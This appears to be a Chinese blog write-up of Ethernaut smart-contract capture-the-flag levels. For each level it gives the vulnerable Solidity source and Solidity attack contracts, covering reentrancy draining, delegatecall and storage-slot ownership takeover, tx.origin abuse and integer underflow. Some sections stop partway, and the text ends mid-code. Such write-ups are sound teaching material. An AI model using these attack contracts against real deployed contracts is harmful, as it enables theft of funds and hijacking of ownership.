[{"title":"Ethernaut","url":"/2023/02/25/Ether/","content":"此文章会记录在Ethernaut上经历的题。\n\nHello Ethernaut在第一题中，我们会跟着引导通过web终端进行操作，基本上没什么难度，一步步地按照提示来做就行。你甚至可以通过直接查看合约ABI来推断出答案，实在是太友好了！！收获：  \n\n关键字的使用\n各种变量的存储位置\n\n\nFallback任务要求：获取合约的所有权；将余额减为零源代码：\n// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Fallback &#123;  mapping(address =&gt; uint) public contributions;  address public owner;  constructor() &#123;    owner = msg.sender;    contributions[msg.sender] = 1000 * (1 ether);  &#125;  modifier onlyOwner &#123;        require(            msg.sender == owner,            &quot;caller is not the owner&quot;        );        _;    &#125;  function contribute() public payable &#123;    require(msg.value &lt; 0.001 ether);    contributions[msg.sender] += msg.value;    if(contributions[msg.sender] &gt; contributions[owner]) &#123;      owner = msg.sender;    &#125;  &#125;  function getContribution() public view returns (uint) &#123;    return contributions[msg.sender];  &#125;  function withdraw() public onlyOwner &#123;    payable(owner).transfer(address(this).balance);  &#125;  receive() external payable &#123;    require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);    owner = msg.sender;  &#125;&#125;\n解题点：\nreceive() external payable &#123;  require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);  owner = msg.sender;&#125;\n要求我们获取合约的所有权就不需要通过另外的攻击合约来进行攻击只需要调用合约内方法进行实现，因此我们可以通过标记owner变量快速查询有关owner的代码。\n在receive方法中我们能够更改owner，在此之前需要我们在contributions中有一点余额，这只需要执行contribute方法就能实现。\n解题参考：1）执行实例中的contribute方法，向合约发送最多0.001ether。2）向合约发送以太，触发receive方法。3）执行实例中的withdraw方法\n\nreceive方法\n\n一个合约至多含有一个receive()函数,\n没有function关键字、没有参数，没有返回值\n可见性必须声明为external，必须含有payable关键字\n允许使用modifier修改器\n\n当本合约收到ether但并未被调用任何函数，未接受任何数据，receive函数被触发，执行ether的传输（类似于基本的send(),transfer()函数）；如果合约中不存在此类方法，但拥有一个可支付的回退函数将触发回退函数执行ether的操作；如果都不存在，那么合约将不能接受ether并抛出异常\n选自solidity官方文档v0.8.13\n\n\nFallout任务要求：获取合约的所有权卖眼镜的做的题源代码：\n// SPDX-License-Identifier: MITpragma solidity ^0.6.0;import &#x27;openzeppelin-contracts-06/math/SafeMath.sol&#x27;;contract Fallout &#123;    using SafeMath for uint256;  mapping (address =&gt; uint) allocations;  address payable public owner;  /* constructor */  function Fal1out() public payable &#123;    owner = msg.sender;    allocations[owner] = msg.value;  &#125;  modifier onlyOwner &#123;\t        require(\t            msg.sender == owner,\t            &quot;caller is not the owner&quot;\t        );\t        _;\t    &#125;  function allocate() public payable &#123;    allocations[msg.sender] = allocations[msg.sender].add(msg.value);  &#125;  function sendAllocation(address payable allocator) public &#123;    require(allocations[allocator] &gt; 0);    allocator.transfer(allocations[allocator]);  &#125;  function collectAllocations() public onlyOwner &#123;    msg.sender.transfer(address(this).balance);  &#125;  function allocatorBalance(address allocator) public view returns (uint) &#123;    return allocations[allocator];  &#125;&#125;\n解题点：\ncontract Fallout is Ownable &#123;...function Fal1out() public payable &#123;...\n注意solidity版本为0.6，这意味着该合约的构造函数是由function 合约名实现的，而在此合约中作为构造函数其名称居然与合约名称不一致，使其成为了任何人都可以执行的公共函数\n\n在solidity 0.4.22版本及其之后中使用function声明构造函数的方法被舍弃，而采用了使用关键字constructor来声明构造函数。\n\n这是在使用编译器0.4.22之前的版本时所需注意的\n\n\n参考：直接调用函数Fal1out\n\nCoin Flip任务要求：连续猜对硬币的正反面十次。区区千分之一的运气我也不是没有源代码：\n// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract CoinFlip &#123;  uint256 public consecutiveWins;  uint256 lastHash;  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;  constructor() &#123;    consecutiveWins = 0;  &#125;  function flip(bool _guess) public returns (bool) &#123;    uint256 blockValue = uint256(blockhash(block.number - 1));    if (lastHash == blockValue) &#123;      revert();    &#125;    lastHash = blockValue;    uint256 coinFlip = blockValue / FACTOR;    bool side = coinFlip == 1 ? true : false;    if (side == _guess) &#123;      consecutiveWins++;      return true;    &#125; else &#123;      consecutiveWins = 0;      return false;    &#125;  &#125;&#125;\n解题点：硬币的正反面取决于上一个块，结果看起来是随机的但却是可预测的，但我们也可以通过获取上一个区块的信息来运行一次题目的算法然后选择对应的结果。因为在一个区块中的交易不止一个，所以只要保证在生成下一个区块前将完成操作即可。\n然而，最优解是通过在另外一份合约，执行预测逻辑，获得对应结果后再调用coinflip完成目标。\n参考：获取实例地址在remix上部署一份攻击合约\ncontract Hack &#123;  CoinFlip target;  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;  constructor(address _target) &#123;    target = CoinFlip(_target);  &#125;  function flip() public &#123;    bool guess = _guess();    target.flip(guess);  &#125;  function _guess() private view returns (bool) &#123;    uint256 blockValue = uint256(blockhash(block.number - 1));    uint256 coinFlip = blockValue / FACTOR;    bool side = coinFlip == 1 ? true : false;    return side;  &#125;&#125;\n之后连续使用攻击合约的flip方法进行攻击10次就行\n\n知识点SafeMath库：防溢出的增强型运算方法block.num：当前区块数（需要添加一个与web3的链接block.blockhash：区块哈希值\n\n\nTelephone任务要求：获取合约的所有权源代码：\n// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Telephone &#123;  address public owner;  constructor() &#123;    owner = msg.sender;  &#125;  function changeOwner(address _owner) public &#123;    if (tx.origin != msg.sender) &#123;      owner = _owner;    &#125;  &#125;&#125;\n解题点：\nfunction changeOwner(address _owner) public &#123;    if (tx.origin != msg.sender) &#123;      owner = _owner;    &#125;&#125;\n本题涉及到tx.origin与msg.sender的区别：\n\ntx.origin是发起交易的账户msg.sender是当前直接调用这个合约的即时账户\n\n例如：Alice通过调用合约A来调用合约B，合约A中与合约B中的tx.origin与msg.sender的情形如下：\n\n\n\nAlice\n-&gt;A\n-&gt;B\n\n\n\ntx.origin\nAlice\nAlice\n\n\nmsg.sender\nAlice\nA\n\n\n如果情景是在一个合约下的调用，那么这两者是没有区别的；\n参考：在remix上部署另一个合约，通过该合约调用实例中的方法改变ownercontract Hack &#123;  constructor(address _addr) &#123;    Telephone(_addr).changeOwner(msg.sender);  &#125;&#125;Token任务要求：获取更多的Token源代码：\n// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract Token &#123;  mapping(address =&gt; uint) balances;  uint public totalSupply;  constructor(uint _initialSupply) public &#123;    balances[msg.sender] = totalSupply = _initialSupply;  &#125;  function transfer(address _to, uint _value) public returns (bool) &#123;    require(balances[msg.sender] - _value &gt;= 0);    balances[msg.sender] -= _value;    balances[_to] += _value;    return true;  &#125;  function balanceOf(address _owner) public view returns (uint balance) &#123;    return balances[_owner];  &#125;&#125;\n解题点：\nfunction transfer(address _to, uint _value) public returns (bool) &#123;    require(balances[msg.sender] - _value &gt;= 0);    balances[msg.sender] -= _value;    balances[_to] += _value;    return true;  &#125;\n这里可以通过下溢 绕过require检测，因为_value和balance[]都为无符号整数，所以结果会变为2^256-1\n参考：略\n\nsolidity的0.6版本还没内置溢出检测，而在0.8及以后版本中当发生溢出后会进行revert。\n\n\nDelegation任务要求：获取合约的所有权源代码：\n// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Delegate &#123;  address public owner;  constructor(address _owner) &#123;    owner = _owner;  &#125;  function pwn() public &#123;    owner = msg.sender;  &#125;&#125;contract Delegation &#123;  address public owner;  Delegate delegate;  constructor(address _delegateAddress) &#123;    delegate = Delegate(_delegateAddress);    owner = msg.sender;  &#125;  fallback() external &#123;    (bool result,) = address(delegate).delegatecall(msg.data);    if (result) &#123;      this;    &#125;  &#125;&#125;\n分析：这题包含了两个合约Delegation和Delegate，Delegation合约实例化了Delegate合约，又在其Fallback函数中使用了delegatecall来调用了delegate合约。\n\ncall函数是一个能对合约发送数据与合约进行交互的底层接口（它们都接受一个 bytes memory 参数，并返回成功条件（作为一个 bool） 和返回的数据（ bytes memory）。而delegatecall（委托调用）又与call有所不同：通过delegatecall调用的目标地址的代码要在当前合约的环境中执行。这个函数主要是方便我们使用存在其他地方的函数——合约可以在运行时动态地从不同的地址加载代码。（用户必须确保两个合约中的存储结构都适合使用delegatecall。）\n\n解题点：delegate.sol合约中有一个公共的pwn函数，可以将owner更改为调用者。\n而在Delegation.sol中，存储在slot0中的值恰好为我们要更改的目标——owner\n因此只要我们通过调用Fallback函数，进行委托调用，更新owner。\n解题参考：在控制台上直接调用contract.sendTransaction(&#123;data:web3.utils.keccak256(&quot;pwn()&quot;).slice(0,10)&#125;)，这表示向合约直接发送一个消息，接着能够直接进入Fallback函数中去。\n或者直接获取实例地址，在Delegate合约中Ataddress，通过调用pwn方法也能够实现目标。但可能因为gas原因无法正常交易，提高燃料限制再进行交易\n\nForce任务要求：让合约的balance大于0\n源代码：\n// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Force &#123;/*                   MEOW ?         /\\_/\\   /    ____/ o o \\  /~____  =ø= / (______)__m_m)*/&#125;\n解题点：MEOW~（不是）\n在以太坊中可以强制给一个合约发送以太，无论合约是否拒绝。通过函数selfdestruct来实现。\n\n这是一个自毁函数，当你调用它的时候，它会使该合约无效化并删除该地址的字节码，然后它会把合约里剩余的资金发送给参数所指定的地址，比较特殊的是这笔资金的发送将无视合约的fallback函数，因为我们之前也提到了当合约直接收到一笔不知如何处理的eth时会触发fallback函数，然而selfdestruct的发送的资金会无视这一点。\n\n因此我们只需要创建一个合约往合约中存点eth然后调用selfdestruct发送给实例合约就行。\n\n在最新版本的solidity中selfdestruct已经被禁用了\n\n\nVault任务要求：将合约中的bool值改变\n源代码：\n// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Vault &#123;  bool public locked;  bytes32 private password;  constructor(bytes32 _password) &#123;    locked = true;    password = _password;  &#125;  function unlock(bytes32 _password) public &#123;    if (password == _password) &#123;      locked = false;    &#125;  &#125;&#125;\n\n解题点：输入密码废话\n任何数据在区块链上都是透明的！（战术后仰）通过web3中的getStorageAt函数直接获取合约里的状态变量的值\n\nweb3.eth.getStorageAt(address, position [, defaultBlock] [, callback])参数1：String 获取存储的地址；参数2：存储的索引位置；参数3：（可选）不使用web3.eth.defaultBlock设置的默认块，而是自定义或预定义的块号；参数4：（可选）可选回调，返回一个错误对象作为第一个参数，结果作为第二个参数Returns ：返回给定位置的值\n选自web3.eth官方文档\n\n在控制台中输入web3.eth.getStorageAt(InstenceAddress, 1)，得到密码——因为在slot0中存储的是锁的状态，所以我们要的是slot1中的密码\n接着，直接调用contract.unlock(&quot;上面获得的数据&quot;)就能通关了。\n\nKing任务要求：确保王位\n源代码：\n// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract King &#123;  address king;  uint public prize;  address public owner;  constructor() payable &#123;    owner = msg.sender;      king = msg.sender;    prize = msg.value;  &#125;  receive() external payable &#123;    require(msg.value &gt;= prize || msg.sender == owner);    payable(king).transfer(msg.value);    king = msg.sender;    prize = msg.value;  &#125;  function _king() public view returns (address) &#123;    return king;  &#125;&#125;\n解题点：payable(king).transfer(msg.value);\n当新的国王诞生时将会给老国王原来的奖金，那么只要原来的国王不接受直接进行revert，那么就可以永远的占据合约的king\n参考：\npragma ...contract attack&#123;  constructor (address _addr) public payable&#123;    _addr.call&#123;gas:100000000,value:msg.value&#125;;  &#125;  // 可以通过不创建任何Fallback或receive方法，也可以通过如下方法  receive() external payable &#123;    revert();  &#125;&#125;\n\nRe-entrancy任务要求：盗取合约中的所有代币\n源代码：\n// SPDX-License-Identifier: MITpragma solidity ^0.6.12;import &#x27;openzeppelin-contracts-06/math/SafeMath.sol&#x27;;contract Reentrance &#123;    using SafeMath for uint256;  mapping(address =&gt; uint) public balances;  function donate(address _to) public payable &#123;    balances[_to] = balances[_to].add(msg.value);  &#125;  function balanceOf(address _who) public view returns (uint balance) &#123;    return balances[_who];  &#125;  function withdraw(uint _amount) public &#123;    if(balances[msg.sender] &gt;= _amount) &#123;      (bool result,) = msg.sender.call&#123;value:_amount&#125;(&quot;&quot;);      if(result) &#123;        _amount;      &#125;      balances[msg.sender] -= _amount;    &#125;  &#125;  receive() external payable &#123;&#125;&#125;\n解题点：\nfunction withdraw(uint _amount) public &#123;    if(balances[msg.sender] &gt;= _amount) &#123;      (bool result,) = msg.sender.call&#123;value:_amount&#125;(&quot;&quot;);      if(result) &#123;        _amount;      &#125;      balances[msg.sender] -= _amount;    &#125;  &#125;\n在整个合约中，只有这个函数才能将代币发送出去：他会接受一个输入，只要我们的余额大于等于指定的金额将会进行发送；然后更新余额。\n因此这是个典型的重入攻击，我们在msg.sender.call()接受余额的同时执行我们的Fallback函数，在fallback中继续调用withdraw。\n同时我们需要再某个时刻打破这个循环，否则会revert：首先可以获取目标合约的余额作为提取的最大金额，我们提取的金额最大为存入的金额，因此将其作为最小值。\n在min(1e18,address(target).balance)中，我们每次获取目标的金额进行判断，在其未归零前都可以进行取款操作。\ncontract Hack &#123;  Reentrance private target;  constructor(address _target) &#123;    target = Reentrance(_target);  &#125;  function attack() external payable &#123;    target.donate&#123;value: 1e18&#125;(address(this));    target.withdraw(1e18);  &#125;  receive() external payable &#123;    uint amount = min(1e18,address(target).balance);    if (amount &gt; 0) &#123;      target.withdraw(amount);    &#125;  &#125;  function min(uint x,uint y) private pure returns (uint) &#123;    return x &lt;= y ? x : y;  &#125;&#125;\n重入的关键：发送完成后才进行了sender的balances更新\n\nElevator这个电梯不让你到达顶楼，想办法到达顶楼\n// SPDX-License-Identifier: MITpragma solidity ^0.8.0;interface Building &#123;  function isLastFloor(uint) external returns (bool);&#125;contract Elevator &#123;  bool public top;  uint public floor;  function goTo(uint _floor) public &#123;    Building building = Building(msg.sender);    if (! building.isLastFloor(_floor)) &#123;      floor = _floor;      top = building.isLastFloor(floor);    &#125;  &#125;&#125;\n该题提供了一个接口Building，我们执行goTo()方法时，在Elevator合约中将在我们的地址上执行接口，接着该接口又会调用isLastFloor函数两次，为了执行判断内语句，第一次isLastFloor返回的结果要求False，接着第二次调用返回的结果需要是True。因此我们只需要实现一个能够在两次调用中实现相反输出的isLastFloor函数。\ncontract Hack &#123;    Elevator private target;    bool private b = true;    constructor (address _target) &#123;      target = Elevator(_target);    &#125;    function isLastFloor(uint) external returns(bool) &#123;        b = !b;        return b;    &#125;        function pwn() public &#123;        target.goTo(1); //输入的数并不最要    &#125;&#125;\n\nPrivacy任务要求：解锁合约。\n源代码：\n// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Privacy &#123;  bool public locked = true;  uint256 public ID = block.timestamp;  uint8 private flattening = 10;  uint8 private denomination = 255;  uint16 private awkwardness = uint16(block.timestamp);  bytes32[3] private data;  constructor(bytes32[3] memory _data) &#123;    data = _data;  &#125;    function unlock(bytes16 _key) public &#123;    require(_key == bytes16(data[2]));    locked = false;  &#125;  /*    A bunch of super advanced solidity algorithms...      ,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`      .,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,      *.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^         ,---/V\\      `*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.    ~|__(o.o)      ^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;  UU  UU  */&#125;\n合约部署需要一个包含3个bytes32元素的数组。而在solidity中是无法直接传递固定大小的数组，可以猜测实例是通过另一个合约协助部署的类似于：\ncontract PrivacyDeployer &#123;    Privacy public privacyInstance;    constructor() &#123;        // Example data for _data parameter        bytes32[3] memory data = [            bytes32(&quot;Some data 1&quot;),            bytes32(&quot;Some data 2&quot;),            bytes32(&quot;Some data 3&quot;)        ];                privacyInstance = new Privacy(data);    &#125;&#125;\n接着要使locked改变，只有调用unlock函数，提供一个bytes16的_key且与_data数组的第三个参数匹配。\n简单回顾一下智能合约中状态变量是如何存储的：\n在合约内部定义状态变量的顺序决定了变量存储在EVM中的字节值。每个slot能存储32字节的数据，在没存储满时允许不超过剩余存储字节的变量接着往后存储。不然开辟新的slot空间存储变量。\n在本题中，首先定义了一个bool变量，占slot0的位置。接下来uint256的ID一共32字节因此在slot1的位置；接着是两个1字节和一个2字节的uint变量都位于slot2的位置，于是bytes32数组的存储位置便在slot3、slot4、slot5。\n而unlock需要的参数便是数组的第三个参数即slot5存储的数据，我们直接用web3中提供的方法获取到便行。然后截取前16字节。\nweb3.eth.getStorageAt(&quot;youraddr&quot;,5)然后.slice(0,34)因为前两位是0x，同是2字符表示1字节，16*2+2=34。\n\nGatekeeper One任务要求：成为entrant\n源代码：\n// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract GatekeeperOne &#123;  address public entrant;  modifier gateOne() &#123;    require(msg.sender != tx.origin);    _;  &#125;  modifier gateTwo() &#123;    require(gasleft() % 8191 == 0);    _;  &#125;  modifier gateThree(bytes8 _gateKey) &#123;      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), &quot;GatekeeperOne: invalid gateThree part one&quot;);      require(uint32(uint64(_gateKey)) != uint64(_gateKey), &quot;GatekeeperOne: invalid gateThree part two&quot;);      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), &quot;GatekeeperOne: invalid gateThree part three&quot;);    _;  &#125;  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;    entrant = tx.origin;    return true;  &#125;&#125;\n要成为entrant，我们只有调用enter方法且满足gateOne，gateTwo，gateThree三个修饰符。现在让我们逐步分析三个修饰符：\n\ngateOne：要求调用者不是外部账户本身，因此，我们需要使用一个合约来调用Gatekeeper的enter函数。\ngateTwo：要求当前交易的剩余燃气量（gasleft()）必须是 8191 的倍数。\ngateThree：传入一个bytes8类型的_gateKey参数。\n第一个条件要求_gateKey的低 32 位等于其低 16 位。\n第二个条件要求_gateKey的低 32 位不等于其低 64 位。\n第三个条件要求_gateKey的低 32 位等于调用者的低 20 位。\n\n\n\n遇到这种构造类题目，从最难的条件开始往前推更一目了然。例如对这道题的分析，第一个修饰符只要我们从另一个合约调用enter方法，因此至少想到攻击合约需要有GatekeeperOne(target).enter(xxx)这样的语句，\n接着第二点需要gasleft()，这没有办法知道答案，只有靠暴力测试一个一个试。\n第三点，满足三个子条件，对于数据转换较多的时候，进行类似因式分解的提取操作能使代码更简洁。这里我们把uint64(_gateKey)替换成一个k，满足条件就为：\n\nuint32(k) &#x3D;&#x3D; uint16(k)\nuint32(k) !&#x3D; k\nuint32(k) &#x3D;&#x3D; uint16(uint160(tx.origin))\n\n这样，我们只着重于构造一个满足上述式子的k值就大功告成了。\n继续分析，从最难的开始：uint32(k) &#x3D;&#x3D; uint16(uint160(tx.origin))，只需要构造一个：uint16 k16 = uint16(uint160(tx.origin))就能满足\n同时，这个k16的值恰好满足uint32(k) == uint16(k)，那我们接着进行第二点：uint32(k) !&#x3D; k，因为我们最后传入的值是bytes8，那么这里用uint64就合适了，如果k的值大于2^32-1，那么在进行uint32强制转换时，它的高位都将被截断，保留低32位，这时uint32(k)将会失去一部分值导致uint32(k) !&#x3D; k。于是最终的k为uint64 k &#x3D; uint64(1 &lt;&lt; 63) + uint64(k16)。再将其转换为一个bytes8类型的数就是我们需要的_gateKey。\ncontract Hack &#123;  GatekeeperOne target;  event Gas(uint num);  constructor(address _target) &#123;    target = GatekeeperOne(_target);  &#125;  function enter(bytes8 key, uint gas) external &#123;    require(target.enter&#123;gas: 8191*10+gas&#125;(key));  &#125;  function Key() public view returns (bytes8) &#123;    uint16 k16 = uint16(uint160(tx.origin));    uint64 k64 = uint64(1 &lt;&lt; 63) + uint64(k16);    bytes8 key = bytes8(k64);    return key;  &#125;  function test(bytes8 key) public &#123;    for (uint i = 100; i &lt; 8191; i++)     &#123;      try target.enter&#123;gas: 8191*10+i&#125;(this.Key())  &#123;        emit Gas(i);        return ;      &#125; catch &#123;&#125;    &#125;    revert(&quot;all failed&quot;);  &#125;&#125;\n\n\nGatekeeper Tow任务要求：成为entrant\n源代码：\n// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract GatekeeperTwo &#123;  address public entrant;  modifier gateOne() &#123;    require(msg.sender != tx.origin);    _;  &#125;  modifier gateTwo() &#123;    uint x;    assembly &#123; x := extcodesize(caller()) &#125;    require(x == 0);    _;  &#125;  modifier gateThree(bytes8 _gateKey) &#123;    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);    _;  &#125;  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;    entrant = tx.origin;    return true;  &#125;&#125;\n同上一个挑战是同一种类型，因此直接分析enter执行条件：\n\ngateOne：要求使用合约调用。\ngateTwo：貌似要求msg.sender不是一个合约。\ngateThree：传入一个bytes8类型的_gateKey参数。\n\n直接分析，关于extcodesize()的部分可以看文章末尾，现在我们满足gateThree：uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max)，一个计算式都看着又臭又长，但是不要怕，我们直接定义变量进行简化。\n首先对左边进行处理：uint64 x = uint64(bytes8(keccak256(abi.encodePacked(msg.sender))))注意，这里的msg.sender应该是我们的合约，因此要用address(this)进行替换，uint64(_gateKey)便是我们传入的值，定义为key，于是简化为：\nx ^ key == type(uint64).max，这样一个异或运算，同时我们知道在异或运算中：a ^ a ^ b = b\n而我们又可以有：x ^ x ^ key == key，这里的x ^ key又等于type(uint64).max，由此可得key = x ^ type(uint64).max\ncontract Hack &#123;  constructor(GatekeeperTwo target) &#123;    uint64 s = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));        uint64 k64 = s ^ type(uint64).max;        bytes8 key = bytes8(k64);    target.enter(key);  &#125;&#125;\n\n\nextcodesize()\n\n\nNaughtCoin任务要求：通过转移走合约中的所有余额。\n源代码：\n// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &#x27;openzeppelin-contracts-08/token/ERC20/ERC20.sol&#x27;; contract NaughtCoin is ERC20 &#123;  // string public constant name = &#x27;NaughtCoin&#x27;;  // string public constant symbol = &#x27;0x0&#x27;;  // uint public constant decimals = 18;  uint public timeLock = block.timestamp + 10 * 365 days;  uint256 public INITIAL_SUPPLY;  address public player;  constructor(address _player)   ERC20(&#x27;NaughtCoin&#x27;, &#x27;0x0&#x27;) &#123;    player = _player;    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));    // _totalSupply = INITIAL_SUPPLY;    // _balances[player] = INITIAL_SUPPLY;    _mint(player, INITIAL_SUPPLY);    emit Transfer(address(0), player, INITIAL_SUPPLY);  &#125;    function transfer(address _to, uint256 _value) override public lockTokens returns(bool) &#123;    super.transfer(_to, _value);  &#125;  // Prevent the initial owner from transferring tokens until the timelock has passed  modifier lockTokens() &#123;    if (msg.sender == player) &#123;      require(block.timestamp &gt; timeLock);      _;    &#125; else &#123;     _;    &#125;  &#125; &#125; \n整个合约中只有transfer()一个函数进行余额转移，同时这个函数受到lockTokens的限制只能在十年后才可以调用。因此我们只能通过其他手段，\n合约导入了ERC20，所以对于代币的转移除了transfer还有transferfrom方法，只需要注意transfrom函数还需要额外的操作：approve。\n整个过程就是：在生成实例后，通过调用ERC20的approve批准将代币转移到攻击合约或其他地方，然后进行transferfrom调用。\ncontract Hack &#123;  function pwn(IERC20 coin) external &#123;    address player = NaughtCoin(address(coin)).player();    uint amount = coin.balanceOf(player);    coin.transferFrom(player, address(this), amount);  &#125;&#125;\n\n\nPreservation任务要求：拥有合约的所有权。\n源代码\n// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Preservation &#123;  // public library contracts   address public timeZone1Library;  address public timeZone2Library;  address public owner;   uint storedTime;  // Sets the function signature for delegatecall  bytes4 constant setTimeSignature = bytes4(keccak256(&quot;setTime(uint256)&quot;));  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) &#123;    timeZone1Library = _timeZone1LibraryAddress;     timeZone2Library = _timeZone2LibraryAddress;     owner = msg.sender;  &#125;   // set the time for timezone 1  function setFirstTime(uint _timeStamp) public &#123;    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));  &#125;  // set the time for timezone 2  function setSecondTime(uint _timeStamp) public &#123;    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));  &#125;&#125;// Simple library contract to set the timecontract LibraryContract &#123;  // stores a timestamp   uint storedTime;    function setTime(uint _time) public &#123;    storedTime = _time;  &#125;&#125;\n在合约中，只有在部署时初始化了owner状态，因此我们对于直接调用某个函数进行owner更新是没有办法的。\n先不要慌，来看看合约中还干了些什么：\n\nRecovery任务要求：从丢失的账户中找回代币。\n源代码\n// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Recovery &#123;  //generate tokens  function generateToken(string memory _name, uint256 _initialSupply) public &#123;    new SimpleToken(_name, msg.sender, _initialSupply);    &#125;&#125;contract SimpleToken &#123;  string public name;  mapping (address =&gt; uint) public balances;  // constructor  constructor(string memory _name, address _creator, uint256 _initialSupply) &#123;    name = _name;    balances[_creator] = _initialSupply;  &#125;  // collect ether in return for tokens  receive() external payable &#123;    balances[msg.sender] = msg.value * 10;  &#125;  // allow transfers of tokens  function transfer(address _to, uint _amount) public &#123;     require(balances[msg.sender] &gt;= _amount);    balances[msg.sender] = balances[msg.sender] - _amount;    balances[_to] = _amount;  &#125;  // clean up after ourselves  function destroy(address payable _to) public &#123;    selfdestruct(_to);  &#125;&#125;\n根据题目大意，在通过Recovery部署的一个SimpToken合约地址丢失了，该合约还含有0.001eth。因此，我们要做的就是1、找回SimpleToken合约的地址。2、回收其0.001ether。\n通过payable关键字可以查到SimpleToken合约中通过receive函数接受ether，同时通过destroy可以向外发送ether，因此只需要能够找到该合约地址并调用destroy方法，那么就能够通过挑战。\n那么怎么获得一个地址呢？首先我们可以接助区块链浏览器查询，但这样的效率太低。因此我们使用另一种办法：构造地址\n以太坊生成地址的逻辑：\n\nMagicNumber任务要求：构造一个合约，使其能够返回正确数字。\n源代码\n// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract MagicNum &#123;  address public solver;  constructor() &#123;&#125;  function setSolver(address _solver) public &#123;    solver = _solver;  &#125;  /*    ____________/\\\\\\_______/\\\\\\\\\\\\\\\\\\_____             __________/\\\\\\\\\\_____/\\\\\\///////\\\\\\___             ________/\\\\\\/\\\\\\____\\///______\\//\\\\\\__             ______/\\\\\\/\\/\\\\\\______________/\\\\\\/___             ____/\\\\\\/__\\/\\\\\\___________/\\\\\\//_____             __/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\_____/\\\\\\//________             _\\///////////\\\\\\//____/\\\\\\/___________             ___________\\/\\\\\\_____/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\_             ___________\\///_____\\///////////////__  */&#125;\n但题目中额外要求：要求不超过10opcodes，也就意味着我们不能通过常规的编写方法来完成这关。\n需要通过字节码来创建一个简单的智能合约，而在这个网站我找到了需要的字节码：\ncontract Hack &#123;  constructor (MagicNum target) &#123;    address addr;    bytes memory bytecode = hex&quot;69602a60005260206000f3600052600a6016f3&quot;;    assembly &#123;      addr := create(0, add(bytecode, 0x20), 0x13)    &#125;    target.setSolver(addr);  &#125; &#125;\n\n\nAlice Codex任务要求：获得合约的所有权。\n源代码\n// SPDX-License-Identifier: MITpragma solidity ^0.5.0;import &#x27;../helpers/Ownable-05.sol&#x27;;contract AlienCodex is Ownable &#123;  bool public contact;  bytes32[] public codex;  modifier contacted() &#123;    assert(contact);    _;  &#125;    function makeContact() public &#123;    contact = true;  &#125;  function record(bytes32 _content) contacted public &#123;    codex.push(_content);  &#125;  function retract() contacted public &#123;    codex.length--;  &#125;  function revise(uint i, bytes32 _content) contacted public &#123;    codex[i] = _content;  &#125;&#125;\n合约继承ownable合约，这个合约的第一个状态变量就是address owner，因此我们要做的就是想办法override这个owner状态变量。\n在codex为0的时候调用retract，将会产生下溢，导致数组的长度变为2**256-1。\n我们再来分析一下storage中的存储状态，在调用retract之前，slot0 - owner（20bytes），contact（1byte），slot1 - length codex\n对于数组元素则是：slot h = codex[0],h=keccak256(1)，整个codex数组占了2**256个槽。\n因此我们要做的就是找到一个索引i，使得slot h+i =slot 0，也即是i&#x3D;-h这样的一个值，然后通过调用revise函数进行覆盖。\n通过调用makeContact()来使我们能够进行retract()、revise()操作。\ncontract Hack &#123;  constructor(AlienCodex target) &#123;    target.makeContact();    target.retract();    uint256 h = uint256(keccak256(abi.encode(uint256(1))));    uint256 i;    unchecked &#123;      i -= h;    &#125;    target.revise(i, byte32(uint256(uint160(msg.sender))));  &#125;&#125;\n\n\nDenial任务要求：拒绝owner进行提款。\n源代码\n// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Denial &#123;    address public partner; // withdrawal partner - pay the gas, split the withdraw    address public constant owner = address(0xA9E);    uint timeLastWithdrawn;    mapping(address =&gt; uint) withdrawPartnerBalances; // keep track of partners balances    function setWithdrawPartner(address _partner) public &#123;        partner = _partner;    &#125;    // withdraw 1% to recipient and 1% to owner    function withdraw() public &#123;        uint amountToSend = address(this).balance / 100;        // perform a call without checking return        // The recipient can revert, the owner will still get their share        partner.call&#123;value:amountToSend&#125;(&quot;&quot;);        payable(owner).transfer(amountToSend);        // keep track of last 